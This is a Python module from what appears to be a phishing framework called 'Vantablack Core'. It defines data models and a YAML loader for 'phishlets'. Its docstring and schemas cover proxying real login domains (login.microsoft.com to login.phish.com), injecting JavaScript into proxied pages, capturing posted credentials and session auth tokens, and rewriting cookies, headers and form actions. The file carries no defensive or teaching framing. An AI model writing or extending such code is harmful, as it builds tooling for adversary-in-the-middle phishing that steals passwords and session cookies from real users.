"""
Vantablack Core v5 - Phishlets (Phishflow 2.0)
==============================================

Handles:
- Loading phishing scenarios (YAML definitions)
- Subdomain mapping (e.g., login.microsoft.com -> login.phish.com)
- Injection rules (JS/CSS overrides)
- Credential capture patterns
"""

import yaml
import logging
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass
from pydantic import BaseModel, Field

class ProxyHost(BaseModel):
    phish_sub: str
    orig_sub: str
    domain: str
    session: bool = False
    is_landing: bool = False
    
    # Legacy support
    subdomain: Optional[str] = None
    target: Optional[str] = None

class SubFilter(BaseModel):
    triggers_on: str
    orig_sub: str
    domain: str
    search: str
    replace: str
    mimes: List[str]
    redirect_only: bool = False

class AuthToken(BaseModel):
    domain: str
    keys: List[str]
    # Legacy support
    type: Optional[str] = None
    name: Optional[str] = None

class CredentialField(BaseModel):
    name: str
    key: str
    search: str
    type: str

class LoginConfig(BaseModel):
    domain: str
    path: str

class JsInject(BaseModel):
    trigger_domains: List[str]
    trigger_paths: List[str]
    script: str

class FormAction(BaseModel):
    selector: str
    action_to: str

class Bridge(BaseModel):
    prefix: str
    target_host: str
    strip_prefix: bool = True
    cors: str = "allow_all"
    origin_host: Optional[str] = None

class HeaderRule(BaseModel):
    action: str
    name: str
    value: Optional[str] = None

class BlockRule(BaseModel):
    pattern: str
    mimes: Optional[List[str]] = None
    max_kb: Optional[int] = None

class PathRewrite(BaseModel):
    pattern: str
    replace: str
    methods: List[str] = Field(default_factory=lambda: ["GET", "POST"])

class CookieRewrite(BaseModel):
    name: str
    domain_to: Optional[str] = None
    path_to: Optional[str] = None
    samesite: Optional[str] = None
    secure: Optional[bool] = None

class PhishletConfig(BaseModel):
    name: str
    author: str
    min_ver: str
    proxy_hosts: List[ProxyHost]
    sub_filters: List[SubFilter] = Field(default_factory=list)
    auth_tokens: List[Union[AuthToken, Dict[str, Any]]]
    credentials: List[CredentialField] = Field(default_factory=list)
    login: Optional[LoginConfig] = None
    js_inject: List[JsInject] = Field(default_factory=list)
    
    # Legacy fields (optional)
    auth_urls: Optional[List[str]] = None
    landing_path: Optional[List[str]] = Field(default_factory=lambda: ["/login"])
    injections: Optional[List[Any]] = None
    headers: List[HeaderRule] = Field(default_factory=list)
    path_rewrites: List[PathRewrite] = Field(default_factory=list)
    cookie_rewrites: List[CookieRewrite] = Field(default_factory=list)
    blocklist: List[BlockRule] = Field(default_factory=list)
    form_actions: List[FormAction] = Field(default_factory=list)
    bridges: List[Bridge] = Field(default_factory=list)

class PhishletLoader:
    def __init__(self):
        self.logger = logging.getLogger("vantablack.edge.phishlets")

    def load_from_yaml(self, yaml_content: str) -> PhishletConfig:
        """Parse YAML content into a PhishletConfig object"""
        try:
            data = yaml.safe_load(yaml_content)
            
            # Handle legacy list-based credentials
            if isinstance(data.get("credentials"), list):
                new_creds = []
                for cred in data["credentials"]:
                    nm = cred.get("name", "unknown")
                    new_creds.append(CredentialField(
                        name=nm,
                        key=nm,
                        search="(.*)",
                        type=cred.get("type", "post_param")
                    ))
                data["credentials"] = new_creds

            # Handle legacy proxy_hosts
            if data.get("proxy_hosts") and "subdomain" in data["proxy_hosts"][0]:
                new_hosts = []
                for host in data["proxy_hosts"]:
                    new_hosts.append(ProxyHost(
                        phish_sub=host.get("subdomain"),
                        orig_sub=host.get("subdomain"),
                        domain=host.get("target", "").split(".", 1)[1] if "." in host.get("target", "") else "com",
                        target=host.get("target"),
                        session=True,
                        is_landing=True
                    ))
                data["proxy_hosts"] = new_hosts

            # Handle legacy auth_tokens
            if data.get("auth_tokens") and isinstance(data["auth_tokens"], list):
                new_tokens = []
                for token in data["auth_tokens"]:
                    if isinstance(token, dict) and "name" in token:
                        # Convert legacy format to new format
                        new_tokens.append(AuthToken(
                            domain="",  # Default domain
                            keys=[token["name"]],  # Use name as key
                            type=token.get("type"),  # Preserve type for legacy
                            name=token.get("name")  # Preserve name for legacy
                        ))
                    else:
                        new_tokens.append(token)
                data["auth_tokens"] = new_tokens

            cfg = PhishletConfig(**data)
            try:
                from core.common.metrics import PHISHLET_LOAD
                PHISHLET_LOAD.inc()
            except Exception:
                pass
            return cfg
        except Exception as e:
            self.logger.error(f"Failed to load phishlet: {e}")
            raise e

    def load_phishlet(self, path: str) -> PhishletConfig:
        """Load phishlet from file path"""
        with open(path, 'r') as f:
            return self.load_from_yaml(f.read())

# Alias for backward compatibility
PhishletManager = PhishletLoader
